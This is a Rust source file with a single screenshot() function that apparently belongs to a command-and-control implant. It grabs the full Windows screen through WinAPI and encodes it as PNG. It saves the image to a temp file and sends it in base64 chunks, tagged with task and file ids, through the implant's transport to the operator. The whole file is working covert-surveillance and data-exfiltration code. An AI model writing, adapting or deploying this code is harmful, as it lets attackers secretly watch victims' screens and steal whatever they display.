pub fn screenshot(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
    use std::{env::temp_dir, fs::{File, metadata}, io::{Read, Write}, path::PathBuf};
    use winapi::um::{
        wingdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, DeleteDC, DeleteObject, GetDIBits, SelectObject, SRCCOPY, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS},
        winuser::{GetDC, ReleaseDC, GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN},
    };
    use base64::engine::general_purpose;
    use base64::Engine;
    use image::{ImageBuffer, Rgba};
    use std::io::Cursor;

    const CHUNK_SIZE: usize = 4096;

    let id = task["id"].as_str().ok_or("missing task id")?;
    let timestamp = task["timestamp"].as_f64().ok_or("missing timestamp")?;

    // ---- CAPTURE SCREEN ----
    let (width, height, buf) = unsafe {
        let h_screen = GetDC(std::ptr::null_mut());
        let w = GetSystemMetrics(SM_CXSCREEN);
        let h = GetSystemMetrics(SM_CYSCREEN);
        let hdc_mem = CreateCompatibleDC(h_screen);
        let h_bitmap = CreateCompatibleBitmap(h_screen, w, h);
        SelectObject(hdc_mem, h_bitmap as _);
        BitBlt(hdc_mem, 0, 0, w, h, h_screen, 0, 0, SRCCOPY);

        let mut bmp_info = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as _,
                biWidth: w,
                biHeight: -h,
                biPlanes: 1,
                biBitCount: 32,
                biCompression: BI_RGB,
                ..std::mem::zeroed()
            },
            bmiColors: [std::mem::zeroed()],
        };

        let mut raw_buf = vec![0u8; (w * h * 4) as usize];
        GetDIBits(hdc_mem, h_bitmap, 0, h as u32, raw_buf.as_mut_ptr() as _, &mut bmp_info, DIB_RGB_COLORS);

        DeleteObject(h_bitmap as _);
        DeleteDC(hdc_mem);
        ReleaseDC(std::ptr::null_mut(), h_screen);

        (w, h, raw_buf)
    };

    crate::helpers::churn(&buf[..buf.len().min(4096)]);

    let mut buf = buf;
    for pixel in buf.chunks_exact_mut(4) {
        pixel.swap(0, 2);
    }

    // ---- ENCODE TO PNG ----
    let img = ImageBuffer::<Rgba<u8>, _>::from_raw(width as u32, height as u32, buf).unwrap();
    let mut png_buf = Vec::new();
    image::codecs::png::PngEncoder::new(&mut png_buf)
        .encode(&img, width as u32, height as u32, image::ColorType::Rgba8)?;

    // ---- SAVE TEMP FILE ----
    let path = temp_dir().join("screenshot.png");
    let mut f = File::create(&path)?;
    f.write_all(&png_buf)?;
    drop(f);

    // ---- UPLOAD PNG ----
    let size = metadata(&path)?.len() as usize;
    let total_chunks = size / CHUNK_SIZE + (size % CHUNK_SIZE > 0) as usize;

    let init = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "completed": true,
            "download": {
                "total_chunks": total_chunks,
                "full_path": path.to_string_lossy(),
                "chunk_size": CHUNK_SIZE,
                "is_screenshot": true
            }
        }]
    })
    .to_string();

    let init_resp: serde_json::Value = crate::transport::send_request_with_response(&init)?;
    let file_id = init_resp["responses"][0]["file_id"]
        .as_str()
        .ok_or("missing file_id")?;

    let mut f = File::open(&path)?;
    let mut buffer = vec![0u8; CHUNK_SIZE];
    let mut chunk_num = 1;

    while let Ok(n) = f.read(&mut buffer) {
        if n == 0 { break; }
        let chunk_data = general_purpose::STANDARD.encode(&buffer[..n]);
        let payload = serde_json::json!({
            "action": "post_response",
            "responses": [{
                "task_id": id,
                "completed": true,
                "download": {
                    "chunk_num": chunk_num,
                    "file_id": file_id,
                    "chunk_data": chunk_data
                }
            }]
        })
        .to_string();
        crate::transport::send_request(&payload)?;
        chunk_num += 1;
    }

    let done = serde_json::json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "user_output": format!("Screenshot uploaded as {}", file_id),
            "agent_file_id": file_id,
            "status": "success",
            "timestamp": timestamp,
            "completed": true
        }]
    })
    .to_string();

    crate::transport::send_request(&done)?;
    Ok(())
}
